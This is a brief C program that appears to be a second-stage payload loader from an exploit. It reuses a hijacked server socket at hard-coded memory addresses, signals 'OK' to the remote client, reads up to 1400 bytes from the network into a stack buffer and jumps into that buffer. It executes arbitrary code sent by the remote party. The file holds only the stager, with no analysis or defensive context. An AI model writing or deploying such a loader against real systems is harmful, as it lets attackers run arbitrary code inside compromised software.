int main() {
    int *server_sockfd = (int *)0x413134;
    struct sockaddr *client_addr = (struct sockaddr *)0x413170;
    sendto(*server_sockfd, "OK", 2, 0, client_addr, 0x10);
    char buf[1400];
    socklen_t addrlen = 0x10;
    recvfrom(*server_sockfd, buf, sizeof(buf), 0, client_addr, &addrlen);
    void (*fn)(void) = (void (*)(void))buf;
    fn();
}
